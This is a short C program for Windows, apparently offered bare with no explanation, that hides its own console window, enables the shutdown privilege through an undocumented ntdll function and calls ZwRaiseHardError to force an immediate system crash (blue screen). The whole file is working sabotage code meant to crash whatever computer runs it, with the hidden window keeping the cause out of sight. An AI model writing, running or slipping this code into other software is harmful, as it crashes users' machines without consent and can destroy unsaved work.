#include <windows.h>
#include<stdlib.h>
int main(){
	ShowWindow(GetForegroundWindow(), SW_HIDE);
	HMODULE ntdll=LoadLibrary("ntdll.dll");
	FARPROC RtlAdjustPrivilege=GetProcAddress(ntdll,"RtlAdjustPrivilege");
	FARPROC ZwRaiseHardError=GetProcAddress(ntdll,"ZwRaiseHardError");
	unsigned char ErrorKill;
	long unsigned int HardError;
	((void(*)(DWORD,DWORD,bool,LPBYTE))RtlAdjustPrivilege)(0x13,true,false,&ErrorKill);
	((void(*)(DWORD,DWORD,DWORD,DWORD,DWORD,LPDWORD))ZwRaiseHardError)(0xc0114514,0,0,0,6,&HardError);
	return 0;
}
